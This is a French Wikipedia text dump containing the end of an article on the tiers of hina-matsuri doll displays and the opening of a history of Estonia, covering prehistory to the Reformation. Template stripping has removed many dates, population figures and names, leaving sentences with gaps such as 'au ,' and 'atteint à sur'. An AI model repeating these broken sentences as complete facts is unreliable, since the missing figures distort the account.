Sur le niveau le plus haut se trouvent les deux , le mot "dairi" désignant la résidence de l'Empereur du Japon. La poupée homme, "obina", tient un tandis que la poupée femme "mebina" tient un éventail. Le couple est également connu sous les noms de et , ou encore et . Bien qu'ils soient appelés Empereur et Impératrice, ils représentent des fonctions et non de vrais individus (sauf pendant l'ère Meiji où certaines poupées représentaient l'Empereur Meiji et son épouse l'Impératrice Shōken).
Un doré fait souvent office d'arrière-plan et des arbres verts sont placés de part et d'autre du couple impérial. On peut aussi ajouter deux et des lanternes de papier ou de soie , généralement décorées de motifs de cerisiers ou de pruniers en fleurs.
Les dispositions les plus complètes ajoutent aussi des accessoires placés entre les deux poupées, appelés , composés de deux vases de artificielles.
En général, dans le Kansai la poupée masculine se trouve à droite, tandis que dans le Kantō elle se trouve à gauche (du point de vue du spectateur).
Deuxième niveau.
Sur le deuxième niveau sont disposées servant le saké au couple impérial. Deux d'entre elles sont debout et portent des pichets de saké, l'un avec une et l'autre avec une . La se place au milieu devant une petite table et peut être assise ou à genoux.
Entre les dames se trouvent des accessoires nommés , constitués de tablettes rondes portant des sucreries de saison à l'exception des "hishi mochi" qui sont placés sur un autre niveau.
Troisième niveau.
 se tiennent sur la troisième marche. Chacun d'entre eux tient un instrument de musique, sauf le chanteur qui porte un éventail :
Dans certains anciens ensembles, on trouvait sept voire dix musiciens. Dans au moins l'un d'entre eux, les musiciens étaient des femmes.
Quatrième niveau.
La quatrième étagère inclut souvent , qui représentent soit les gardes du corps de l'empereur, soit des administrateurs à Kyoto : le et le . Ils sont tous les deux équipés d'arcs et de flèches. Le ministre de droite est généralement représenté jeune et celui de gauche plus âgé, car cette position est réservée à l'aîné des deux. Parce que les poupées sont placées relativement l'une à l'autre, le ministre de droite est en fait à droite de la scène (donc à gauche du point de vue du spectateur) et le ministre de gauche de l'autre côté.
Entre les deux poupées sont placées des tables couvertes de bols, appelées ou . On place également des "hishimochi", des petits "mochi" tricolores, en forme de losange, sur des tablettes de même forme.
Juste devant les ministres se trouvent des arbustes : à droite un , à gauche un .
Cinquième niveau.
La cinquième marche, entre les arbres, contient trois ou du couple impérial :
Niveaux inférieurs.
Sur les niveaux inférieurs sont présents divers personnages et accessoires miniatures, comme des chars à bœufs.
Sixième niveau.
On y trouve des objets et des meubles utilisés au palais impérial :
Septième niveau.
On y trouve d'autres objets et meubles utilisés au palais impérial :

</doc>
<doc id="1440" url="https://fr.wikipedia.org/wiki?curid=1440" title="Histoire de l'Estonie">
Histoire de l'Estonie

L’histoire de l’Estonie, pays situé sur la rive orientale de la mer Baltique qui a accédé à l’indépendance en 1918, débute au , lorsque les premières populations nomades pénètrent sur son territoire libéré par la dernière glaciation. Selon la théorie la plus répandue, le peuple finno-ougrien, dont descend la majeure partie des Estoniens contemporains, arrive dans la région vers le en introduisant la céramique à peigne commune à plusieurs peuples rattachés à la même famille linguistique.
Au début du les rives sud de la mer Baltique constituent une des dernières contrées païennes d’Europe. Les croisades baltes (1200-1227), menées sur le territoire par un ordre militaire teutonique, les chevaliers Porte-Glaive, réalisent la conquête du pays dont les habitants sont convertis à la foi chrétienne. Un État dominé conjointement par des princes-évêques et l’ordre des moines soldats se constitue sur le territoire correspondant à l’Estonie et à la Lettonie modernes. Une société aux classes sociales particulièrement marquées s’installe : la minorité d’origine allemande constitue l’élite politique, militaire, religieuse, intellectuelle et monopolise le commerce et la propriété foncière. Ces Germano-Baltes dominent la population indigène, finno-ougrienne sur le territoire estonien, qui reste cantonnée aux rôles subalternes. Cette division perdure jusqu’en 1917. Entre 1418 et 1562 la région forme la Confédération livonienne. Le pays est touché par la Réforme au début du et opte pour le luthéranisme. Il est le théâtre de conflits qui l’opposent à des voisins de plus en plus puissants : la Russie, la Lituanie, la république des Deux Nations et la Suède. Finalement cette dernière annexe la région en 1595. Initialement, les souverains suédois ne remettent pas en cause la suprématie de la noblesse balte d’origine germanique descendante des chevaliers Porte-Glaive. Cette politique change avec (de Suède), mais les tentatives de réformes sont interrompues par la défaite de la Suède face à la Russie au cours de la grande guerre du Nord. À compter de 1710, le territoire estonien devient pour deux siècles une région de l’Empire russe.
Au la noblesse foncière germanophone, à qui les dirigeants russes laissent une grande autonomie, maintient les paysans finno-ougriens dans le servage. Celui-ci n’est aboli qu’au début du siècle suivant, en partie sous la pression du pouvoir russe, en partie grâce à quelques germanophones éclairés. Certains de ces derniers, qualifiés d’estophiles, s’intéressent à la langue, la culture et l’histoire des autochtones. Des intellectuels membres de la classe moyenne estonienne, qui commence à se former à cette époque, vont prendre le relais en faisant un travail de collecte de la mémoire populaire et en affinant la langue ; ces travaux permettent l’apparition des premiers périodiques et ouvrages de fiction en estonien. À la fin du siècle, la langue estonienne, dopée par une tentative de russification, commence à se substituer à l’allemand, qui était jusque-là seule utilisée par les élites. À la même époque la proportion de paysans propriétaires croit fortement. Au début du apparaissent les premiers partis politiques estoniens dont les revendications se cantonnent à une autonomie limitée et à l’égalité de statut avec les germanophones qui conservent une grande partie des pouvoirs.
En 1920, à l’issue de la Première Guerre mondiale qui a déclenché l’effondrement de l’Empire russe, l’Estonie acquiert, comme ses voisins baltes, son indépendance après une guerre de courte durée contre l’Armée rouge. Les terres agricoles encore détenues par la noblesse germanophone sont redistribuées aux paysans et un régime parlementaire s’installe. Celui-ci, menacé durant la Grande Dépression par la montée d’un mouvement populiste, se transforme en régime semi-autoritaire à compter de 1934. À la veille de la Seconde Guerre mondiale, les clauses secrètes du Pacte germano-soviétique qui lie l'Allemagne nazie et l'Union soviétique, permettent à cette dernière d’occuper l’Estonie. Le pays est ravagé par son occupant. La minorité germanophone abandonne le pays qu’elle dominait depuis sept siècles pour répondre à l’appel des autorités nazies. Lorsque l’Allemagne déclare la guerre à l’Union soviétique en 1941, l’Estonie est envahie par les Allemands, puis reconquise par l’Armée rouge en 1944. Une partie de la population fuit alors l’occupant par crainte de représailles et quitte définitivement le pays. L’Estonie, malgré une longue résistance clandestine d’une partie de ses habitants, passe sous administration soviétique. Dans son objectif de propagande, l'URSS créé de toutes pièces une république soviétique pour faire croire à une adhésion volontaire du pays à l'idéologie communiste. La société estonienne et son économie sont profondément transformées par l’envahisseur. De nombreuses industries sont installées et l’agriculture est collectivisée. Une forte minorité russe s’installe pour fournir des bras à ces nouvelles activités. L’éclatement de l’Union soviétique en 1991 permet à l’Estonie de retrouver son indépendance à l’issue d’un processus pacifique. Le nouvel État se transforme rapidement grâce à une forte croissance de l’économie et la mise en place d’institutions politiques et économiques modernes. Soucieuse de conserver son indépendance face à un voisin russe qui accepte mal le nouvel ordre des choses, l’Estonie adhère à l’OTAN et intègre l’Union européenne en 2004.
Protohistoire.
La période mésolithique.
Les premières incursions humaines sur le territoire de l’Estonie libéré tardivement par la dernière glaciation se produisent au À cette époque, une partie des zones littorales sont encore sous les eaux de la mer Baltique, notamment l’île de Saaremaa : l’élévation générale de la région, soulagée du poids des glaces, va progressivement les faire émerger au cours des millénaires suivants. Les glaciers, en se retirant, ont laissé des moraines qui bloquent l’écoulement des eaux et sont à l’origine des lacs et des marécages qui recouvrent 20 % du territoire. La couverture végétale se limite à l’époque à une toundra. Les premières traces d’établissement humain ont été découvertes sur le cours inférieur du fleuve Pärnu ; elles forment la culture dite « de Kunda », du nom de la ville la plus proche. Ces précurseurs, venus du sud, sont des semi-nomades qui vivent au bord des lacs, des rivières puis par la suite de la mer, en pratiquant la cueillette, la chasse et la pêche au harpon, à l’hameçon et au filet.
La période néolithique.
Le début du Néolithique est marqué par l’apparition des céramiques, dite de Narva (du nom de la ville près de laquelle les premières trouvailles ont été effectuées), dont les plus anciennes remontent à 4900 Le climat est à l’époque devenu plus clément et des forêts de feuillus se sont substituées à la toundra. Les premières poteries sont réalisées en argile épais mélangé avec des galets, des coquillages et des plantes. Les céramiques de cette culture ont été trouvées tout le long des côtes et dans les îles. L’outillage en pierre et en os est proche de celui produit par la culture de Kunda.
Vers le apparaissent les céramiques à peigne (le décor consiste en stries faites avec un peigne) qui vont coexister pendant plusieurs siècles avec les céramiques de Narva. Ce type de céramique semble une spécificité des peuples de langue finno-ougrienne car on les trouve également en Finlande et dans l'Oural où vivaient sans doute des peuples parlant une langue apparentée. Il est donc possible que le peuple, dont descendent les Estoniens de langue finno-ougrienne contrairement à leurs voisins du sud (Lettons) et de l'est (Russes), soit arrivé à cette époque. Les analyses génétiques effectuées contredisent toutefois en partie cette dernière théorie car, si les Estoniens ont bien un patrimoine génétique particulier, ils le partagent avec les Lettons et les Lituaniens. Selon les théories les plus récentes, basées sur l'analyse de l'ADN, le berceau des Estoniens modernes, qu'on situait jusqu'à récemment vers la Sibérie ou au pied du massif de l'Oural, serait plutôt localisé dans la région de la steppe pontique. Si les chasseurs-cueilleurs estoniens de la culture de la céramique au peigne sont proches génétiquement des anciens chasseurs-cueilleurs de l'Est européen, les nouvelles populations de la céramique cordée ont une ascendance prédominante dans la steppe, ancêtres qui s'étaient mélangés de manière spécifique selon le sexe avec les premiers agriculteurs européens d'origine anatolienne
Ainsi, vers 3200 une nouvelle population, sans doute d'origine indo-européenne, donc utilisant une langue rattachée à un rameau complètement différent du finno-ougrien, arrive dans la région : son apparition se traduit par l’apparition de la céramique cordée, de haches en pierre particulièrement bien finies (haches naviformes) et par l'amorce d'une activité agricole et de d'élevage. Les premières fermes sont construites à l'époque. Il semble qu'après une période de coexistence qui va jusqu’au , la langue finno-ougrienne s'impose sur le territoire de l'Estonie, au nord et sur la côte de la Lettonie, tandis que le parler des derniers arrivants s'impose dans le reste de la Lettonie et plus au sud. Toutefois, chaque langue emprunte sans doute à cette époque une fraction de son vocabulaire à l'autre. Par la suite, aucun autre mouvement de population massif ne semble avoir touché le territoire de l’Estonie. La population estonienne et sa langue semblent donc descendre directement des habitants de cette époque.
L'âge du bronze.
L’âge du bronze commence dans la région vers 1800 Le mode de vie reste initialement toujours nomade mais l’élevage et l’agriculture commencent à se développer. Des objets en bronze apparaissent sans doute en provenance du sud. Entre 1500 et 1000 , les objets en bronze sont importés de Scandinavie avec laquelle un courant d’échange a pu se mettre en place grâce aux progrès de la navigation. L’influence culturelle des peuples du nord de la Baltique ou peut-être un début de colonisation peut être détecté par l’apparition sur le sol estonien de nouvelles sépultures de type scandinave : celles-ci sont constituées de sarcophages en pierre de forme circulaire ou ovale. La crémation apparaît mais coexiste avec l’inhumation. La langue semble avoir emprunté à cette époque certains termes scandinaves. Dans la région qu’occupe aujourd’hui Tallinn, l’orge commence à être cultivée dans des champs délimités par des murs de pierre à partir de 1000 ; l’utilisation de la charrue semble se répandre tandis que la culture du lin pour le tissage apparaît sans doute à la même époque. La population, jusque-là concentrée le long des rivières et des lacs, se répand dans l’intérieur du pays. Les premiers oppida apparaissent, traduisant une insécurité croissante liée à un début d’accumulation de richesses.
L'âge du fer.
Vers le apparaissent sur le territoire de l’Estonie les premiers objets en fer : ce sont essentiellement des armes et des bijoux importés du sud. De cette époque datent les « champs celtiques » de forme quadrangulaire et entourés de clôture, ainsi que les pierres à cavité artificielle qui devaient servir à des rites magiques de fertilité. Des différences commencent à apparaître entre l’Estonie du Nord sous influence scandinave et l’Estonie méridionale au contact avec les peuples du Sud et de l’Est. Un artisanat local se met en place vers le L’empire romain, malgré son éloignement, fait sentir son influence entre l’an 50 et l’an 450 ; les échanges sont sans doute favorisés par la route de l’ambre qui permet de ramener cette résine fossile très prisée à Rome et qui abonde sur la côte de la mer Baltique. On a découvert sur le territoire estonien de nombreux objets d’origine romaine : bijoux, lampes à huile, monnaie. Les fibules des costumes traditionnels estoniens ont sans doute une origine romaine. Le nombre d’oppida augmente dans le Nord et le Nord-Ouest de l’Estonie actuelle, ainsi que les caches d’armes et de bijoux, ce qui reflète une instabilité croissante. Les sépultures conservent leur style scandinave mais croissent en taille et en richesse et sont ceintes d’enclos ; les offrandes qui y sont placées ne sont plus constituées d’armes mais de bijoux. Le pays est défriché, l’agriculture et l’élevage se généralisent, et des villages, de forme circulaire dans l’Ouest ou linéaires ailleurs, se créent sur tout le territoire. La population, croissante, atteint peut-être à sur le territoire de l’Estonie actuelle au tournant du millénaire.
Comme dans le reste de l’Europe, les grandes invasions s’accompagnent d’un déclin économique. Cette période, dite de l’âge du fer moyen (450-700), est marquée par la généralisation des et des sépultures d’un style moins élaboré, simples tas de pierre ou tumulus de terre dans lesquels on trouve à nouveau des armes. Les Slaves qui progressent pacifiquement depuis leur région d’origine prennent sans doute contact durant cette période avec les habitants occupant le territoire de l’Estonie, et s’installent dans les régions voisines qui deviendront plus tard les principautés russes de Pskov et Novgorod. La frontière linguistique entre les deux populations se fixe pratiquement à cette époque.
À partir de 800, les Varègues qui avaient subi une éclipse, sont de retour sur la rive sud-est de la Baltique : ces marchands guerriers mettent en place une nouvelle route commerciale entre la Scandinavie d’une part et Byzance et le monde arabe d’autre part ; celle-ci emprunte la rivière Daugava, aujourd’hui en territoire letton. La cité-État de Novgorod et la Rus' de Kiev, embryon de la future Russie, dont les Varègues sont les fondateurs, leur servent de relais et contribuent à nourrir le trafic. Les échanges portent notamment sur le sel, les objets en métal, les étoffes, les esclaves, les fourrures et le miel. Bien que n’étant pas situé sur la route principale qui passe plus au sud, les occupants du territoire estonien profitent de ce courant commercial comme en témoigne la découverte de nombreuses pièces arabes.
À l'aube de l'histoire.
La christianisation de l'Estonie commence dès le milieu du : le prosélytisme évangélique encouragé par le patriarche Photios Ier de Constantinople voit l'introduction de la foi orthodoxe chez les peuples d'Estlandie et de Livonie, grâce à des moines byzantins qui ont suivi la route des échanges commerciaux entre les empereurs d'Orient et les Vikings. Plus tard le moine Germain, venu du mont Athos, fonde le monastère de Valaam en Carélie ; ces premiers chrétiens de confession orthodoxe sont placés sous la juridiction du Patriarcat œcuménique de Constantinople.
À compter de 1050, les marchands allemands commencent à concurrencer les Scandinaves. Les évènements durant cette période ont pu être reconstitués grâce aux premières sources écrites fiables portant sur la région. L’est du territoire tombe dans la sphère d’influence des principautés russes ; selon les chroniques russes de l’époque, les princes russes montent régulièrement des expéditions pour extorquer des tributs aux Tchoudes ; les Russes regroupent sous cette appellation les peuples lettons, estoniens, lives, ingriens et votes. Au cours d’une de ces expéditions, Iaroslav le Sage, prince de Kiev, fonde en 1030 la ville de Iourev et y fait bâtir l'église saint-Georges ; Iourev disparaîtra une trentaine d’années plus tard, mais sur son emplacement sera élevée par la suite Tartu ("Dorpat" en allemand) qui deviendra la deuxième ville d’Estonie. Les sagas norvégiennes de l’époque indiquent que certaines régions de l’Ouest de l’Estonie actuelle versent un tribut de manière épisodique aux scandinaves ou sont l’objet de raids armés. Mais les indigènes ne sont pas sans défense et d’autres récits témoignent d’attaques régulières des autochtones contre Pskov, la plus proche des villes russes, ou de raids sanglants contre l’île danoise d’Öland (1170) ou la ville de Sigtuna, à l’époque capitale de la Suède.
La société estonienne se structure.
Malgré ce climat de violence, la population autochtone augmente fortement et atteint vers 1200. La surpopulation est particulièrement forte dans l’île de Saaremaa, ce qui explique peut-être la réputation de nid de pirates qu’elle acquiert à cette époque. L’agriculture se développe : un nouveau type de charrue est adopté qui se conservera jusqu’au ; la culture de l’orge prend de l’importance tandis que l’élevage se substitue définitivement à la chasse en tant que source de protéines. L’habitat groupé est constitué de chaumières, d’une seule pièce pour les plus pauvres, dépourvues de fenêtres, pour conserver la chaleur, avec un seuil rehaussé, une petite entrée non chauffée et un foyer couvert ancêtre du poêle four. L’époque voit apparaître des forteresses de mieux en mieux fortifiées, abritant parfois de manière permanente la population locale, signe de temps troublés. De petites agglomérations commencent à apparaître : la plus grande, Varbola, compte à l’époque peut être .
Cette période de l’histoire a été fortement idéalisée au par les nationalistes estoniens car elle précède l’invasion allemande qui va complètement transformer la région. Pourtant, tout laisse à penser qu’une société inégalitaire se met en place, dont on trouve des traces à travers la richesse de certaines sépultures et habitations. Les membres d’une élite politico-militaire désignés sous le terme d’Anciens, de Seigneurs ou de Puissants (dans la littérature contemporaine les "vanemad" c’est-à-dire anciens), se recrutent sans doute parmi les principaux propriétaires fonciers et utilisent le clientélisme pour asseoir leur pouvoir. Celui-ci comprend notamment la justice, la collecte des impôts, les corvées et le service militaire. Les esclaves, en partie autochtones, sont nombreux. Il n’y a pas, semble-t-il, d’entité politique à l’échelle de l’Estonie, mais des structures en place à l’échelle locale aux contours mouvants et instables. Sur le territoire de l’Estonie, on en trouve deux niveaux de regroupement : le "kihelkond" (plus tard traduit en "paroisse") comporte quelques milliers d’habitants et, sur une partie de la région, le "maakond" (plus tard traduit en "comté") qui englobe 3 à . Vers 1200, il y a environ 45 paroisses et 7 comtés. Le plus vaste des comtés est l'Ungannie ("Ugandi") qui se trouve au sud-est de la région, à cheval sur le territoire occupé par les populations de langues baltes (actuel Nord de la Lettonie). Au sud-ouest, le comté de Sakala est centré autour de l'emplacement de l'actuelle Viljandi. Le comté de Revala ("Rävala") s’étend dans la région de l'actuelle Tallinn (appelée "Reval" par les allemands). Au nord-est on trouve le comté de Viru ("Virumaa") qui a donné le nom finnois de l’Estonie ("Viro") et sur le comté de l'Ouest ("Läänemaa") qui s'étend sur la côte. Au centre du pays se trouvent les comtés de Järva et Harju. Enfin l’île de Saaremaa forme également un comté. Les régions situées au Nord de l'actuelle Tartu ne semblent pas être des comtés à proprement parler. L'étude des langues et des restes archéologiques montrent qu'il existe une variété de tribus estoniennes avec des parlers et coutumes distinctes. Durant le conflit du début du , les tribus des différents comtés ne constituent jamais un front uni face à l’envahisseur.
Sur le plan religieux, malgré l'absence de sources fiables, on peut déduire des indices disponibles que les indigènes adoraient des dieux représentant les forces de la nature et leur sacrifiaient des animaux et parfois des humains, qu'ils honoraient les morts et pratiquaient la divination. Ils édifiaient des sanctuaires avec des images des divinités et vénéraient des bosquets sacrés. Toutes ces pratiques sont très proches de celles de la Scandinavie avant sa christianisation.
La christianisation des pays baltes (1186-1227).
Le contexte des croisades.
Le est en Europe la période des croisades, qui visent à convertir à la foi chrétienne les peuples païens, si besoin par la force des armes. Coincées entre la Scandinavie catholique et la Russie orthodoxe, les régions bordant la côte sud de la mer Baltique, de la Prusse à l'Estonie, sont à l'époque les dernières contrées païennes sur le continent européen. Des missions de conversion étaient parties de Scandinavie aux sans rencontrer de succès. À la même époque, les côtes de la Baltique, aujourd'hui allemandes et occupées alors de manière sporadique par le peuple slave des Wendes, sont colonisées par des populations germaniques en expansion démographique. Plusieurs ports sont fondés dont Lübeck en 1143. En 1161, les marchands allemands de cette ville fondent avec les commerçants de Hambourg la Hanse : ce réseau d'entraide vise à protéger leur commerce en mer du Nord et en mer Baltique. Intérêt commercial et esprit de croisade vont converger pour déclencher un mouvement qui aboutira à la colonisation germanique des pays baltes : le mouvement migratoire allemand qui se poursuit se heurte bientôt aux peuplades païennes qui vivent plus à l'est en Prusse et en Lituanie, tandis que les marchands de la Hanse souhaitent sécuriser la rive sud-est de la Baltique occupée par les populations païennes dont l'instabilité politique est peu propice à leur commerce avec les principautés russes ; par ailleurs les chevaliers du Saint-Empire romain germanique, dont le rôle en Terre sainte est marginal, sont à la recherche d'une terre de croisade et vont jeter leur dévolu sur ce dernier territoire païen.
La conquête des territoires baltes.
En 1186, un religieux allemand du nom de Meinhard de Holstein, crée une première implantation appelée Üxhüll (aujourd'hui Ikšķile en Lettonie) sur la Daugava et fonde un évêché sur le territoire des Lives, un peuple païen qui occupe alors une partie de zone côtière de la Lettonie actuelle. La région est baptisée par les nouveaux venus Livonie (Livland en allemand "pays des Lives") bien que cette population n'en occupe qu'une faible partie. L'entreprise de conversion, après un succès initial, se heurte bientôt à des résistances. Le successeur de Meinhard, qui a reçu une bulle de croisade du pape Célestin III, est tué peu après son arrivée dans la région en 1198. Le pape Innocent III relance la croisade et consacre un nouvel évêque à qui des moyens importants sont donnés. En 1200, ces croisés, dirigés par le nouveau prince-évêque de Riga, Albert de Buxhoeveden, fondent la ville de Riga, aujourd'hui capitale de la Lettonie, à l'embouchure de la rivière Daugava. Riga va devenir rapidement par la suite un centre religieux et un important relais pour les marchands allemands sur la route commerciale qui relie les ports hanséatiques au territoire russe. En 1202, un ordre de moines soldats, les chevaliers Porte-Glaive "(Fratres militiæ Christi)" est fondé dans cette ville ; le pape accorde au nouvel ordre le statut de templiers, pour seconder les efforts d'évangélisation.
En 1208, les croisés, qui ont pris le dessus sur le territoire correspondant aujourd'hui à la Lettonie, s'attaquent aux territoires voisins occupés par les finno-ougriens qu'ils baptisent "Estes" en reprenant une appellation utilisée par l'auteur latin Tacite. L'histoire de la conquête de ces territoires nous est connue grâce à une chronique tenue par un prêtre de l'ordre des Porte-Glaive, Henri le Letton, qui a participé activement à la croisade. Les chevaliers s'attaquent d'abord à l'Ugandi au sud-est de l'Estonie actuelle, dont les habitants harcèlent les convois commerciaux qui circulent vers les villes russes de Novgorod et Pskov. Ces principautés russes s'inquiètent de l'avancée des croisés allemands et elles vont tenter par la suite de contrer la croisade, soit en s'alliant avec les indigènes, soit en menant leur propre entreprise de conquête. Otepää tombe à l'automne, mais les croisés aidés par des forces auxiliaires composées de Lives et de Latagaliens, autre peuple balte, sont défaits à l'été 1210 par un "malev" (une force indigène) sur la rivière Ûmera. Les forces en présence sont de faible importance puisque les chevaliers Porte-Glaive allemands ne sont que 20. En mars 1211, les croisés avancent de nouveau et obtiennent la reddition de Viljandi. Une épidémie qui ravage la région arrête temporairement les combats. Ceux-ci reprennent en 1215 dans un contexte confus où les indigènes tour à tour se rallient ou prennent les armes contre les croisés avec l'appui des russes : l'Ugandi et le Sakala sont conquis. Le "vanem" (chef) de Sakala, Lembitu est fait prisonnier puis rallié. Les indigènes finissent par s'organiser en un front uni qui parvient à rassembler une force estimée à par Henri le Letton (chiffre sans doute exagéré) qui assiège Otepää et obtient sa reddition. Lembitu, qui a rompu ses liens avec les croisés, prend la tête de la résistance. Le 21 septembre 1217, indigènes sont défaits par les rassemblés par les croisés, au cours de la bataille de la saint Matthieu près de l'agglomération de Lehola. Lembitu est tué. Les régions de l'Estonie centrale sont désormais aux mains des croisés.
Mais le territoire n'est pas complètement pacifié et un raid parti de Lituanie le dévaste en partie. Le prince-évêque décide de faire appel au roi du Danemark Valdemar II (de Danemark) pour prendre en tenaille la résistance. Celui-ci effectue un débarquement en 1219 sur la côte nord de l'Estonie dans le golfe de Finlande avec une force importante et édifie une forteresse à l'emplacement de la future capitale de l'Estonie, Tallinn ("Reval" en allemand). Les Danois, qui se heurtent rapidement aux forces indigènes qu'ils ont tenté de rallier, parviennent à maintenir leur contrôle sur la région. Cette conquête provoque toutefois en 1222 un soulèvement général qui gagne l'ensemble du territoire estonien. La forteresse de Viljandi tombe et seule celle de Tallinn résiste encore. Mais, malgré les troupes envoyées par les principautés russes appelées en renfort, le territoire est repris par les croisés. Seuls les habitants de l'île de Saaremaa ("Ösel" en allemand) continuent de résister jusqu'en 1227 : cette année-là une expédition dirigée par les croisés franchit la mer prise dans les glaces et obtient la reddition de la dernière forteresse indigène à Valjala. Plusieurs soulèvements auront encore lieu notamment à Saaremaa qui reprend son indépendance entre 1236 et 1241, en 1255 et 1261 mais la domination des croisés n'est désormais plus réellement remise en question.
La confédération livonienne (1227-1558).
Durant les trois siècles suivants, les territoires conquis correspondant à la Lettonie et à l'Estonie constituent un État théocratique, la confédération livonienne, où le pouvoir est réparti entre les princes-évêques et les chevaliers Porte-Glaive. Ces derniers continuent leur croisade contre les Lituaniens païens mais également contre les Russes orthodoxes donc schismatiques. Mais leurs effectifs limités (quelques centaines de chevaliers) ne leur permettent pas de vaincre des états qui gagnent progressivement en puissance durant cette période.
Un état faible, féodal et théocratique.
Peu après la fondation de l'ordre, les chevaliers Porte-Glaive avaient pris une grande autonomie vis-à-vis de l'autorité papale. En 1225, profitant de difficultés dans lesquelles se débat le royaume de Danemark, ils envahissent les possessions danoises situées au nord de la Livonie ; ils n'hésitent pas à combattre les forces placées sous l'autorité du moine Baudoin d'Alne envoyé par le pape pour mettre de l'ordre dans ce conflit entre chrétiens. Par ailleurs les conflits sont permanents entre l'ordre des chevaliers Porte-Glaive et le prince-évêque Albert de Buxhoeveden. Ce dernier, en tant qu'initiateur et organisateur de la croisade, estime que ses évêchés doivent recevoir les deux tiers des terres conquises. Ce partage accepté, non sans conflit, du vivant d'Albert est remis en cause après son décès en 1229. Finalement en 1236 les chevaliers Porte-Glaive, affaiblis par la défaite subie contre les Lituaniens à Saulè, acceptent un compromis : le traité de Stensby fixe le découpage du territoire. En ce qui concerne le territoire de l'Estonie moderne, le Virumaa, le Harjumaa et le Räval au nord sont attribués au roi du Danemark ; le Sakala, le Järvamma, l'île de Muhu et une partie du Valga au centre et au sud-est reviennent à l'ordre ; le Läänemaa au nord-ouest et les îles forment l'évêché de Saare-Lääne tandis que l'évêché Tartu comprend l'Ugandi et une grande partie du Valga au sud-est.
L'ordre des chevaliers Porte-Glaive, dont les effectifs sont tombés très bas, est rattaché à celui des chevaliers teutoniques qui remplit une mission analogue à celle de l'ordre en Prusse-Orientale depuis 1230, en combattant les Prussiens païens et les Lituaniens. Ils prennent le nom d'ordre de Livonie et conservent néanmoins leur autonomie. Ils sont placés sous les ordres d'un grand maître qui réside à Riga puis à Cēsis sur le territoire de la Lettonie moderne. L'absence d'autorité centrale au sein de la confédération livonienne entraîne de nombreux conflits au cours des entre les évêques et leurs vassaux d'une part et l'ordre de Livonie d'autre part, sans qu'aucune des parties n'arrive à l'emporter. Les chevaliers Porte-Glaive atteignent le faîte de leur puissance lorsqu'en 1345 Valdemar III, roi du Danemark, qui fait face à une guerre civile, leur vend la province d'Estonie et la ville de Narva. Mais à la suite de la défaite de Tannenberg, l'ordre, affaibli, doit accepter la mise en place d'une forme de pouvoir central en 1421 : la diète de Livonie, qui se réunit environ une fois par an, doit permettre d'aplanir les conflits entre ses membres qui représentent les évêchés, les villes et l'ordre. La mise en place de cette institution n'empêche pas les conflits de se poursuivre et une semi-anarchie de se perpétuer sur le territoire de la Livonie.
La société de la Livonie médiévale.
À l'issue de la conquête, la société livonienne se structure en deux classes de population bien distinctes ; cette caractéristique, relativement commune en Europe au Moyen Âge, va par contre perdurer jusqu'au dans la région. La minorité germanophone ("Deutschen" c'est-à-dire les Allemands) est concentrée dans les villes et forme l'élite politique, militaire, commerciale et religieuse. Les « indigènes » ("Undeutschen" c'est-à-dire les non-allemands) forment la paysannerie et les classes sociales inférieures des villes. Un courant d'émigration constant venu d'Allemagne vient grossir les effectifs de commerçants et d'artisans installés dans les cités, mais la campagne, aux terres trop pauvres, est laissée aux indigènes qui préserveront ainsi leur langue et leur culture. Estimée à environ avant le début de la croisade, la population des territoires correspondant à l'Estonie tombe à à l'issue de la conquête. Elle remontera à au début du et à plus de au milieu du .
Les villes, qui sont fortifiées, sont souvent fondées par l'occupant sur d'anciens oppida indigènes. Ce sont initialement les lieux où se concentrent les pouvoirs politique et religieux, mais très vite l'artisanat et le commerce s'y développent : Tallinn à partir de 1285, Tartu, Viljandi ("Fellinn" en allemand) et la seconde Pärnu ("Pernau" en allemand) au , adhèrent à l'association des villes commerçantes de la Hanse. Ces villes sont essentiellement des relais sur les routes commerciales qui mettent en communication d'une part la Russie exportatrice notamment de fourrures, cire et miel et importatrice de sel, vin, articles de luxe et pièces de laine, et d'autre part la Scandinavie et l'Europe occidentale. Le marché local exporte du seigle. Les commerçants s'organisent en guildes peu ouvertes aux indigènes. Les villes restent de taille modeste : au Tallinn, la plus grande cité de la région, compte moins de , Tartu moins de et Narva ("Narwa" en allemand) 700.
La vie culturelle et religieuse.
La création artistique de l'époque répond essentiellement à des objectifs religieux. Les bâtiments qui subsistent de cette période sont proches des productions allemandes contemporaines. Ce sont des édifices simples qui peuvent être élégants comme Saint-Olaf à Tallinn ou Saint-Jean à Tartu, généralement conçus par des artistes originaires d'Allemagne. Les édifices en pierre sont peu nombreux : édifices religieux, couvents et châteaux de l'ordre ainsi que quelques bâtiments civils en particulier dans la ville de Tallinn. Les écrits de l'époque, dont il ne reste pratiquement rien, sont en latin et pour les usages quotidiens en bas-allemand.
La christianisation des populations s'opère très progressivement et des traces de paganisme subsisteront longtemps dans la pratique religieuse comme le culte de la foudre encore pratiqué au . Un syncrétisme est réalisé à travers le culte de saints. Par contre la pratique de la crémation est rapidement abandonnée. Le clergé catholique, initialement originaire des pays scandinaves, est recruté à partir du en Allemagne et vient grossir la classe dominante germanophone. Au début du le territoire compte trois évêchés dont le pouvoir temporel s'exerce sur de larges portions du territoire et 97 paroisses. Les ordres religieux (cisterciens, dominicains, augustinien) se taillent de vastes domaines au .
La réforme protestante, qui apparaît en Allemagne en 1517, est adoptée dès 1523 à Tartu. L'opposition d'une partie du clergé et de l'ordre de Livonie est rapidement balayée par un puissant mouvement de la population, profondément exaspérée par les abus de l'Église : un peu partout, les reliques et les images saintes présentes dans les édifices religieux sont détruites tandis que les ordres religieux sont contraints de quitter les couvents et les monastères. Sur l'ensemble du territoire, entre 1524 et 1525, le nouveau dogme s'impose dans les villes puis gagne les campagnes dans les décennies qui suivent. La diète de Livonie adopte officiellement la Réforme en 1533, mais les évêchés resteront catholiques jusque dans les années 1560. La nouvelle religion, qui insiste sur l'accès des chrétiens à la parole de Dieu, suscite l'apparition des premiers écrits en estonien. Un recueil de prières, rédigé dans les trois langues indigènes dont l'estonien, est ainsi imprimé à Lübeck en 1525, mais aucune Bible ne sera traduite à cette époque.
La condition paysanne.
